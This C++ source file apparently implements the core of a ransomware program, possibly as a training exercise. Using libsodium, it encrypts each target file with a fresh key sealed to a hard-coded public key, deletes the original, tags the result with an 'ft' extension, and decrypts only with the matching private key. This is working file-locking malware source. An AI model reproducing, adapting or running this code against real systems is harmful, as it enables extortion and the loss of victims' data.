#include "CryptoManager.hpp"
#include "Logs.hpp"
#include <iostream>
#include <fstream>


cryptoManager::~cryptoManager()
{
}
cryptoManager::cryptoManager(Config &conf, Logs &logs) : _conf(conf), _logs(logs), _header(HEADER_SIZE)
{
    _buffer.resize(BUFFER_SIZE);
    _files = _filemanager.getTargetFiles();
}

void cryptoManager::generateSymKey()
{
    crypto_secretbox_keygen(_symKey.data());
}
void cryptoManager::encryptSymmKey()
{
    hexToBinAsymPubKey();
    crypto_box_seal(_symKeyEncrypted.data(), _symKey.data(), _symKey.size(), _asymKeyPub.data());
}

void cryptoManager::writeEncryptSymmKey()
{
    _out.write(reinterpret_cast<const char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
}

bool cryptoManager::initSecretStreamPush()
{
    if (crypto_secretstream_xchacha20poly1305_init_push(&_state, _header.data(), _symKey.data()) != 0)
        return (_logs.printError("Failed to initialize XChaCha20-Poly1305 stream"), false);
    return true;
}

void cryptoManager::writeHeader()
{
    _out.write(reinterpret_cast<const char *>(_header.data()), _header.size());
}

void cryptoManager::writeEncryptedData()
{
    while (_in)
    {
        _in.read(reinterpret_cast<char *>(_buffer.data()), _buffer.size());
        std::streamsize bytesRead = _in.gcount();
        if (bytesRead > 0)
            cryptAndWriteData(bytesRead);
    }
}
void cryptoManager::cryptAndWriteData(std::streamsize bytesRead)
{
    unsigned long long clen;
    _encryptedBuffer.resize(bytesRead + STREAM_MAC_SIZE);
    crypto_secretstream_xchacha20poly1305_push(&_state, _encryptedBuffer.data(), &clen, _buffer.data(), bytesRead, nullptr, 0, 0);
    _out.write(reinterpret_cast<char *>(_encryptedBuffer.data()), clen);
}

void cryptoManager::init()
{
    if (sodium_init() < 0)
        throw(std::runtime_error("Lipsodium initialization failed"));
}

void cryptoManager::processFiles()
{
    if (_conf.reverse)
        decryptFiles();
    else
        encryptFiles();
}

void cryptoManager::encryptFiles()
{
    for (auto &file : _files)
    {
        if (!openFileStreams(file))
            continue;
        generateSymKey();
        encryptSymmKey();
        writeEncryptSymmKey();
        if (!initSecretStreamPush())
            continue;
        writeHeader();
        writeEncryptedData();
        fs::remove(file);
        _filemanager.addFtExt(_tmpPath);
    }
}

bool cryptoManager::openFileStreams(fs::path file)
{
    _in = _filemanager.openOriginalFile(file);
    if (!_in)
        return (_logs.printError("Failed to open: " + file.filename().string()), false);
    _out = _filemanager.createNewFile(file, _tmpPath);
    if (!_out)
        return (_logs.printError("Creation of the new file failed for file: " + file.filename().string()), false);
    return true;
}

void cryptoManager::decryptFiles()
{
    hexToBinAsymPrivKey();
    hexToBinAsymPubKey();
    for (auto &file : _files)
    {
        if (!openFileStreams(file))
            continue;
        readEncryptedSymKey();
        if (!decryptSymKey())
            continue;
        readSecretStreamHeader();
        if (!initSecretStreamPull())
            continue;
        writeDecryptedData();
        fs::remove(file);
        _filemanager.removeFtExt(_tmpPath);
    }
}

void cryptoManager::readEncryptedSymKey()
{
    _in.read(reinterpret_cast<char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
}
bool cryptoManager::decryptSymKey()
{
    if (crypto_box_seal_open(_symKey.data(), _symKeyEncrypted.data(), _symKeyEncrypted.size(),
                             _asymKeyPub.data(), _asymKeyPriv.data()) != 0)
        return (_logs.printError("Failed to decrypt symmetric key"), false);
    return true;
}

void cryptoManager::readSecretStreamHeader()
{
    _in.read(reinterpret_cast<char *>(_header.data()), _header.size());
}

bool cryptoManager::initSecretStreamPull()
{
    if (crypto_secretstream_xchacha20poly1305_init_pull(&_state, _header.data(), _symKey.data()) != 0)
        return (_logs.printError("Invalid key or header"), false);
    return true;
}

void cryptoManager::writeDecryptedData()
{
    _encryptedBuffer.resize(ENCRYPTED_BUFFER_SIZE);
    unsigned char tag;
    unsigned long long out_len;

    while (_in)
    {
        readCryptedData();
        std::streamsize bytesRead = _in.gcount();
        if (bytesRead > 0 && !decryptData(tag, out_len, bytesRead))
            break;
        _out.write(reinterpret_cast<char *>(_buffer.data()), out_len);
        if (tag == TAG_FINAL)
            break;
    }
}

void cryptoManager::readCryptedData()
{
    _in.read(reinterpret_cast<char *>(_encryptedBuffer.data()), _encryptedBuffer.size());
}

bool cryptoManager::decryptData(unsigned char &tag, unsigned long long &out_len, std::streamsize bytesRead)
{
    if (crypto_secretstream_xchacha20poly1305_pull(&_state, _buffer.data(), &out_len,
                                                   &tag, _encryptedBuffer.data(), bytesRead, nullptr, 0) != 0)
        return (_logs.printError("Data decryption failed"), false);
    return true;
}


void cryptoManager::hexToBinAsymPrivKey()
{
  
    if (sodium_hex2bin(
            _asymKeyPriv.data(),
            _asymKeyPriv.size(),
            _conf.reverseKey.c_str(),
            _conf.reverseKey.size(),
            nullptr, nullptr, nullptr) != 0)
    {
        std::cerr << "Invalid hex private key" << std::endl;
    }
    char pk_hex[crypto_box_SECRETKEYBYTES * 2 + 1];
    sodium_bin2hex(pk_hex, sizeof(pk_hex), _asymKeyPriv.data(), _asymKeyPriv.size());
    std::cout << "Private key: " << pk_hex << std::endl;
}

void cryptoManager::convertsymKeyToHex()
{
    sodium_bin2hex(_hex_symKey.data(), _hex_symKey.size(), _symKey.data(), _symKey.size());
}

void cryptoManager::hexToBinAsymPubKey()
{
    sodium_hex2bin(_asymKeyPub.data(), _asymKeyPub.size(), ASYM_KEY_PUB.c_str(), ASYM_KEY_PUB.size(), nullptr, nullptr, nullptr);
}

void cryptoManager::printHExsymKey()
{
    std::cout << "sym Key = " << _hex_symKey.data() << std::endl;
}